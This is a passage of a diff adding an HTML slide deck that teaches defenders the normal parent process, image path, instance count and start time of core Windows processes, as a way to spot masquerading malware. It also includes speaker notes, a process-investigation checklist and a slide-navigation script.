+          <p><strong>Session 0 vs. Session 1:</strong> Session 0 is the isolated, non-interactive session that hosts services and the OS itself; Session 1 (and up) is the interactive desktop a user actually logs into. A process that should live in one session showing up in the other is a red flag on its own.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 13 — Windows Processes: System
+         ========================================== -->
+    <div class="slide" data-slide="12" data-title="Windows Processes — System"
+         data-notes="First of the critical-process deep-dives. System (PID 4) is the anchor case: it owns kernel-mode threads, has no image on disk, no parent, and always runs as PID 4 under Local System. Emphasize the invariants students should memorize, since deviations from any of them (wrong PID, an actual file path, a parent process) are a strong sign of masquerading malware.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>System <span class="mono" style="font-size: 0.65em; color: var(--text-muted);">PID 4</span></h2>
+        <p style="margin-top: 0.9em;">The <strong class="blue">System</strong> is not an actual executable but a representation of the Windows kernel itself. It owns the core system threads and is responsible for managing the CPU, memory, and hardware resources.</p>
+
+        <div class="info-table">
+          <div class="info-table-row">
+            <div class="info-table-label">Image Path</div>
+            <div class="info-table-value">None <span class="dim">(or <span class="mono blue">C:\Windows\system32\ntoskrnl.exe</span>)</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">PID</div>
+            <div class="info-table-value">4</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Parent Process</div>
+            <div class="info-table-value">None <span class="dim">(or System Idle Process)</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Number of Instances</div>
+            <div class="info-table-value">1</div>
+          </div>
+          <div class="info-table-row">
+
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Start Time</div>
+            <div class="info-table-value">At Boot</div>
+          </div>
+        </div>
+
+        <div class="warn-box" style="margin-top: 1.2em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="2"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div>
+          <p><strong>Know the invariants:</strong> <span class="mono">System</span> should always be <strong class="red">PID 4</strong>, have no parent, and no file on disk. A process named "System" with a different PID, a parent, or a real image path is not the real one.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 14 — Windows Processes: smss.exe
+         ========================================== -->
+    <div class="slide" data-slide="13" data-title="Windows Processes — smss.exe"
+         data-notes="Second of the critical-process deep-dives. smss.exe is the Session Manager Subsystem — it's the direct child of System (PID 4) and the parent of wininit.exe and csrss.exe, tying straight back to the process tree diagram. One master instance persists for the life of the system; each per-session child instance does its job and self-terminates, so seeing more than one smss.exe still running is itself worth investigating.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>smss.exe <span class="mono" style="font-size: 0.6em; color: var(--text-muted);">Session Manager Subsystem</span></h2>
+        <p style="margin-top: 0.9em;"><strong class="blue">smss.exe</strong> is the first user-mode process created by the kernel during startup. It is responsible for initializing new sessions and launching the next processes in the boot sequence, after which it terminates.</p>
+
+        <div class="info-table">
+          <div class="info-table-row">
+            <div class="info-table-label">Image Path</div>
+            <div class="info-table-value"><span class="mono">%SystemRoot%\System32\smss.exe</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Parent Process</div>
+            <div class="info-table-value">System <span class="dim">(4)</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Number of Instances</div>
+            <div class="info-table-value">1 master, 1 child instance per session <span class="dim">(children self-terminate)</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Start Time</div>
+            <div class="info-table-value">Within seconds of boot</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 15 — Windows Processes: csrss.exe
+         ========================================== -->
+    <div class="slide" data-slide="14" data-title="Windows Processes — csrss.exe"
+         data-notes="Third of the critical-process deep-dives. csrss.exe is the Client/Server Runtime Subsystem — it's a child of smss.exe but shows as an orphan once smss.exe self-terminates, which is expected and not a red flag on its own. There are always two or more instances (one per session), and both should spin up within seconds of boot. A csrss.exe running from anywhere other than System32, or one running under a non-Local-System account, is masquerading malware.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>csrss.exe <span class="mono" style="font-size: 0.6em; color: var(--text-muted);">Client/Server Runtime Subsystem</span></h2>
+        <p style="margin-top: 0.9em;"><strong class="blue">csrss.exe</strong> runs continuously in the background of every session. It manages core functions such as console windows and shutdown procedures, and although users never interact with it directly, the system cannot function without it.</p>
+
+        <div class="info-table">
+          <div class="info-table-row">
+            <div class="info-table-label">Image Path</div>
+            <div class="info-table-value"><span class="mono">%SystemRoot%\System32\csrss.exe</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Parent Process</div>
+            <div class="info-table-value">smss.exe <span class="dim">(orphan process)</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Number of Instances</div>
+            <div class="info-table-value">Two or more</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Start Time</div>
+            <div class="info-table-value">Within seconds of boot <span class="dim">(first two instances)</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 16 — Windows Processes: wininit.exe
+         ========================================== -->
+    <div class="slide" data-slide="15" data-title="Windows Processes — wininit.exe"
+         data-notes="Fourth of the critical-process deep-dives. wininit.exe is what actually builds out Session 0 — the isolated, non-interactive session that hosts services and system processes, distinct from the interactive Session 1 a user logs into. It runs once, spawns services.exe and lsass.exe, and then its job is essentially done. Like csrss.exe, showing as an orphan is expected once smss.exe self-terminates.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>wininit.exe <span class="mono" style="font-size: 0.6em; color: var(--text-muted);">Windows Initialization</span></h2>
+        <p style="margin-top: 0.9em;"><strong class="blue">wininit.exe</strong> is a critical Windows system process that initializes the operating system during startup and launches essential system processes such as services.exe and lsass.exe</p>
+
+        <div class="info-table">
+          <div class="info-table-row">
+            <div class="info-table-label">Image Path</div>
+            <div class="info-table-value"><span class="mono">%SystemRoot%\System32\wininit.exe</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Parent Process</div>
+            <div class="info-table-value">smss.exe <span class="dim">(orphan process)</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Number of Instances</div>
+            <div class="info-table-value">1</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Start Time</div>
+            <div class="info-table-value">Within seconds of boot</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 17 — Windows Processes: services.exe
+         ========================================== -->
+    <div class="slide" data-slide="16" data-title="Windows Processes — services.exe"
+         data-notes="Fifth of the critical-process deep-dives. services.exe is the Service Control Manager (SCM) — it's the process that starts, stops, and manages every Windows service, which makes it one of the most abused parents in persistence hunting: a huge share of malicious autostart services show up as children of services.exe. Point out the LastKnownGood CurrentControlSet detail as a specific, memorable fact worth retaining.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>services.exe <span class="mono" style="font-size: 0.6em; color: var(--text-muted);">Service Control Manager</span></h2>
+        <p style="margin-top: 0.9em;"><strong class="blue">services.exe</strong> functions as the central manager for all Windows services, responsible for starting, stopping, and tracking them. Nearly every background service on the system ultimately traces back to this process.</p>
+
+        <div class="info-table">
+          <div class="info-table-row">
+            <div class="info-table-label">Image Path</div>
+            <div class="info-table-value"><span class="mono">%SystemRoot%\System32\services.exe</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Parent Process</div>
+            <div class="info-table-value">wininit.exe</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Number of Instances</div>
+            <div class="info-table-value">1</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Start Time</div>
+            <div class="info-table-value">Within seconds of boot</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="slide" data-slide="17" data-title="Windows Processes — svchost.exe"
+         data-notes="svchost.exe hosts service DLLs so many Windows services can share a small number of processes instead of each needing its own executable. The -k parameter groups related services into the same instance, which is why it's completely normal to see 10+ svchost.exe processes running at once — but that same normalcy is exactly what attackers exploit for masquerading, so the parent, path, and count all matter for spotting fakes.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>svchost.exe <span class="mono" style="font-size: 0.6em; color: var(--text-muted);">Service Host</span></h2>
+        <p style="margin-top: 0.9em;"><strong class="blue">svchost.exe</strong> allows multiple Windows services to run within a shared process rather than each requiring its own executable. As a result, it is normal for several instances of it to run simultaneously.</p>
+
+        <div class="info-table">
+          <div class="info-table-row">
+            <div class="info-table-label">Image Path</div>
+            <div class="info-table-value"><span class="mono">%SystemRoot%\System32\svchost.exe</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Parent Process</div>
+            <div class="info-table-value">services.exe</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Number of Instances</div>
+            <div class="info-table-value">Many (typically 10+)</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Start Time</div>
+            <div class="info-table-value">Within seconds of boot or whenever services start</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="slide" data-slide="18" data-title="Windows Processes — lsass.exe"
+         data-notes="lsass.exe is the Local Security Authority Subsystem Service — it enforces the security policy on the system, handles user authentication, and writes to the security event log. There should only ever be one instance, running as Local System under wininit.exe, spawned within seconds of boot. It's one of the most targeted processes for credential dumping (e.g. Mimikatz), so any deviation from these invariants is a strong signal.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>lsass.exe <span class="mono" style="font-size: 0.6em; color: var(--text-muted);">Local Security Authority Subsystem Service</span></h2>
+        <p style="margin-top: 0.9em;"><strong class="blue">lsass.exe</strong> authenticates user credentials at login and enforces the system's local security policies. Because it handles sensitive credential data, it is a frequent target for attackers attempting to extract passwords.</p>
+
+        <div class="info-table">
+          <div class="info-table-row">
+            <div class="info-table-label">Image Path</div>
+            <div class="info-table-value"><span class="mono">%SystemRoot%\System32\lsass.exe</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Parent Process</div>
+            <div class="info-table-value">wininit.exe</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Number of Instances</div>
+            <div class="info-table-value">1</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Start Time</div>
+            <div class="info-table-value">Within seconds of boot</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="slide" data-slide="19" data-title="Windows Processes — winlogon.exe"
+         data-notes="winlogon.exe manages the login and logout procedures, loads the user's profile (NTUSER.DAT), and is what listens for the Secure Attention Sequence (Ctrl+Alt+Del) to guard against credential-capturing fake login screens. It's an orphan process spawned by smss.exe, which then exits — so winlogon.exe legitimately has no living parent, a fact worth calling out since 'no parent' looks suspicious out of context but is normal here.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>winlogon.exe <span class="mono" style="font-size: 0.6em; color: var(--text-muted);">Windows Logon</span></h2>
+        <p style="margin-top: 0.9em;"><strong class="blue">winlogon.exe</strong> manages the sign-in and sign-out screen. It also listens for the Ctrl+Alt+Del sequence, which protects users against fraudulent login screens designed to capture credentials.</p>
+
+        <div class="info-table">
+          <div class="info-table-row">
+            <div class="info-table-label">Image Path</div>
+            <div class="info-table-value"><span class="mono">%SystemRoot%\System32\winlogon.exe</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Parent Process</div>
+            <div class="info-table-value">smss.exe (orphan process)</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Number of Instances</div>
+            <div class="info-table-value">1 or more</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Start Time</div>
+            <div class="info-table-value">Within seconds of boot (Session 1)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="slide" data-slide="20" data-title="Windows Processes — explorer.exe"
+         data-notes="explorer.exe is the Windows shell — it draws the desktop, taskbar, and Start Menu, and provides the file/folder GUI. It's spawned by userinit.exe, which then exits, making explorer.exe another legitimate orphan. Because it runs under the logged-in user's own account (not a service account), it's a very common process for attackers to hide malicious child processes under, since a child of explorer.exe blends in with everyday user activity.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>explorer.exe <span class="mono" style="font-size: 0.6em; color: var(--text-muted);">Windows Explorer</span></h2>
+        <p style="margin-top: 0.9em;"><strong class="blue">explorer.exe</strong> provides the graphical interface that users directly interact with — the desktop, taskbar, Start Menu, and file windows are all rendered by this process.</p>
+
+        <div class="info-table">
+          <div class="info-table-row">
+            <div class="info-table-label">Image Path</div>
+            <div class="info-table-value"><span class="mono">%SystemRoot%\explorer.exe</span></div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Parent Process</div>
+            <div class="info-table-value">userinit.exe (orphan process)</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Number of Instances</div>
+            <div class="info-table-value">1 or more</div>
+          </div>
+          <div class="info-table-row">
+            <div class="info-table-label">Start Time</div>
+            <div class="info-table-value">When interactive user sessions begin</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="slide" data-slide="21" data-title="Process Investigation"
+         data-notes="This is the checklist to apply when looking at any suspicious process: does it sit where it should in the process tree (right parent, right children), is it launched with normal arguments, is the name itself legitimate rather than a typo or lookalike, and is it running from the expected executable path. Any one mismatch is a lead worth pulling on.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> PROCESS INVESTIGATION</div>
+        <h2>Process Investigation</h2>
+        <ul style="margin-top: 1em;">
+          <li><strong class="blue">Parent Process</strong>
+            <ul style="margin-top: 0.4em; margin-bottom: 0.6em;">
+              <li style="font-size: 0.85rem; color: var(--text-secondary);">Is this the expected process hierarchy?</li>
+            </ul>
+          </li>
+          <li><strong class="blue">Child Process</strong>
+            <ul style="margin-top: 0.4em; margin-bottom: 0.6em;">
+              <li style="font-size: 0.85rem; color: var(--text-secondary);">Is this the expected process hierarchy?</li>
+            </ul>
+          </li>
+          <li><strong class="blue">Command Line Arguments</strong>
+            <ul style="margin-top: 0.4em; margin-bottom: 0.6em;">
+              <li style="font-size: 0.85rem; color: var(--text-secondary);">Does it include unusual switches, encoded commands, or suspicious paths?</li>
+            </ul>
+          </li>
+          <li><strong class="blue">Process Names</strong>
+            <ul style="margin-top: 0.4em; margin-bottom: 0.6em;">
+              <li style="font-size: 0.85rem; color: var(--text-secondary);">Typos, lookalikes, copies</li>
+            </ul>
+          </li>
+          <li><strong class="blue">Image Path</strong>
+            <ul style="margin-top: 0.4em; margin-bottom: 0.6em;">
+              <li style="font-size: 0.85rem; color: var(--text-secondary);">Is this process running the expected executable?</li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+  </div><!-- /presentation -->
+
+  <!-- Bottom Bar -->
+  <div id="bottom-bar">
+    <div class="bottom-left">
+      <span id="slide-counter">01 / 17</span>
+    </div>
+    <div style="display:flex; align-items:center; gap:8px;">
+      <div class="nav-controls">
+        <button class="nav-btn nav-btn--notes" id="btn-notes" title="Speaker Notes (Key: N)">📝 Notes</button>
+        <button class="nav-btn" id="btn-prev" aria-label="Previous slide">←</button>
+        <button class="nav-btn" id="btn-next" aria-label="Next slide">→</button>
+      </div>
+    </div>
+  </div>
+
+  
+  <!-- Speaker Notes Overlay -->
+  <!-- Speaker Notes Overlay -->
+  <div id="speaker-notes-overlay" role="dialog" aria-label="Speaker Notes">
+    <div class="notes-header">
+      <div class="notes-title">
+        <span>📝</span> Speaker Notes
+        <span id="notes-slide-num" style="font-size:0.75rem; color:var(--text-muted); font-weight:normal; margin-left:6px;"></span>
+      </div>
+      <button class="notes-close" id="btn-close-notes" aria-label="Close notes">&times;</button>
+    </div>
+    <div class="notes-body" id="notes-content"></div>
+  </div>
+
+  <script>
+    (() => {
+      const slides = document.querySelectorAll('.slide');
+      const total = slides.length;
+      let current = 0;
+
+      const counterEl     = document.getElementById('slide-counter');
+      const progressEl    = document.getElementById('progress-bar');
+      const headerTitleEl = document.getElementById('header-slide-title');
+
+      
+      const notesOverlay   = document.getElementById('speaker-notes-overlay');
+      const notesBtn       = document.getElementById('btn-notes');
+      const notesCloseBtn  = document.getElementById('btn-close-notes');
+      const notesContent   = document.getElementById('notes-content');
+      const notesSlideNum  = document.getElementById('notes-slide-num');
+
+      function updateNotes() {
+        if (!notesOverlay) return;
+        const note = slides[current].getAttribute('data-notes');
+        const title = slides[current].getAttribute('data-title') || `Slide ${current + 1}`;
+        if (notesSlideNum) notesSlideNum.textContent = `(${String(current + 1).padStart(2, '0')}/${String(total).padStart(2, '0')} - ${title})`;
+        if (note && note.trim().length > 0) {
+          notesContent.innerHTML = `<p>${note.replace(/\n/g, '<br>')}</p>`;
+        } else {
+          notesContent.innerHTML = `<span class="notes-empty">No speaker notes recorded for this slide.</span>`;
+        }
+      }
+
+      function toggleNotes() {
+        const overlay = document.getElementById('speaker-notes-overlay');
+        const btn = document.getElementById('btn-notes');
+        if (!overlay) return;
+        const isActive = overlay.classList.toggle('active');
+        if (btn) btn.classList.toggle('active', isActive);
+        if (isActive) updateNotes();
+      }
+
+      if (notesBtn) notesBtn.addEventListener('click', toggleNotes);
+      if (notesCloseBtn) notesCloseBtn.addEventListener('click', () => {
+        notesOverlay.classList.remove('active');
+        if (notesBtn) notesBtn.classList.remove('active');
+      });
+
+      function goTo(index) {
+        if (index < 0 || index >= total || index === current) return;
+        slides[current].classList.remove('active');
+        slides[current].scrollTop = 0;
+        slides[index].classList.add('active');
+        slides[index].scrollTop = 0;
+        current = index;
+        updateUI();
+      }
+
+      function updateUI() {
+        counterEl.textContent = `${String(current + 1).padStart(2, '0')} / ${String(total).padStart(2, '0')}`;
+        progressEl.style.width = `${((current + 1) / total) * 100}%`;
+        headerTitleEl.textContent = slides[current].getAttribute('data-title') || '';
+        if (notesOverlay && notesOverlay.classList.contains('active')) updateNotes();
+      }
+
+      document.addEventListener('keydown', (e) => {
+        if (e.code === 'KeyN' || e.key === 'n' || e.key === 'N' || e.key === 'ى') { e.preventDefault(); toggleNotes(); }
+        else if (e.key === 'Escape') {
+          if (notesOverlay && notesOverlay.classList.contains('active')) {
+            e.preventDefault();
+            notesOverlay.classList.remove('active');
+            if (notesBtn) notesBtn.classList.remove('active');
+          }
+        }
+        else if (e.key === 'ArrowRight' || e.key === ' ') { e.preventDefault(); goTo(current + 1); }
+        else if (e.key === 'ArrowLeft') { e.preventDefault(); goTo(current - 1); }
+        else if (e.key === 'ArrowDown') {
+          const s = slides[current];
+          if (s && s.scrollHeight > s.clientHeight && s.scrollTop + s.clientHeight < s.scrollHeight - 5) {
+            e.preventDefault(); s.scrollBy({ top: 100, behavior: 'smooth' });
+          } else { e.preventDefault(); goTo(current + 1); }
+        }
+        else if (e.key === 'ArrowUp') {
+          const s = slides[current];
+          if (s && s.scrollHeight > s.clientHeight && s.scrollTop > 5) {
+            e.preventDefault(); s.scrollBy({ top: -100, behavior: 'smooth' });
+          } else { e.preventDefault(); goTo(current - 1); }
+        }
+        else if (e.key === 'Home') { e.preventDefault(); goTo(0); }
+        else if (e.key === 'End')  { e.preventDefault(); goTo(total - 1); }
+      });
+
+      document.getElementById('btn-prev').addEventListener('click', () => goTo(current - 1));
+      document.getElementById('btn-next').addEventListener('click', () => goTo(current + 1));
+
+      let touchStartX = 0;
+      document.addEventListener('touchstart', (e) => { touchStartX = e.changedTouches[0].screenX; });
+      document.addEventListener('touchend', (e) => {
+        const diff = touchStartX - e.changedTouches[0].screenX;
+        if (Math.abs(diff) > 50) { diff > 0 ? goTo(current + 1) : goTo(current - 1); }
+      });
+
+      updateUI();
+    })();
+  </script>
+
+</body>
+</html>
